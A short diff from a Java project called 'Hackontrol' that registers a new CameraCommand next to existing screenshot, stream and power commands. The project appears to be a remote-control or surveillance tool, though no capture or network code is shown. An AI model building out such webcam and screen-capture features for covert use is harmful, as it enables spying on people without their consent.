@@ -7,6 +7,7 @@ import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.Random;
 
+import com.khopan.hackontrol.command.CameraCommand;
 import com.khopan.hackontrol.command.Command;
 import com.khopan.hackontrol.command.DeviceListCommand;
 import com.khopan.hackontrol.command.HelpCommand;
@@ -46,6 +47,7 @@ public class Hackontrol {
 		this.registerCommand(new ScreenshotCommand());
 		this.registerCommand(new StreamCommand());
 		this.registerCommand(new PowerCommand());
+		this.registerCommand(new CameraCommand());
 	}
 
 	private void registerCommand(Command command) {
